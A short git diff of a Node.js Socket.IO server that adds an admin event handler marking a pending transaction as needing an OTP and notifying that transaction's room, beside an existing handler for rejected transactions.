@@ -131,7 +131,6 @@ io.on("connection", (socket) => {
     /* ------------------------ ADMIN REJECTS TRANSACTION ------------------------- */
     socket.on("admin-reject-txn", (data) => {
         console.log("Admin rejected transaction:", data);
-
         pendingConfirmations[data.transaction_id] = {
             ...data,
             status: "rejected"
@@ -141,6 +140,20 @@ io.on("connection", (socket) => {
         io.to(roomName).emit("txn_rejected", data);
         console.log(`Broadcasted txn_rejected to ${roomName}`);
     });
+// Server-side: handle admin OTP-needed confirmation
+socket.on("admin_confirm_otp_needed", (data) => {
+    console.log("Admin marked OTP needed for transaction:", data);
+
+    pendingConfirmations[data.transaction_id] = {
+            ...data,
+            status: "otpNeeded"
+        };
+    const roomName = `txn-${data.transaction_id}`;
+    // Optionally, notify the user in that transaction room
+    io.to(roomName).emit("otp_needed", data);
+
+    // You can also save this info to DB if needed
+});
 
     /* ------------------------------ DISCONNECT ------------------------------ */
     socket.on("disconnect", () => {
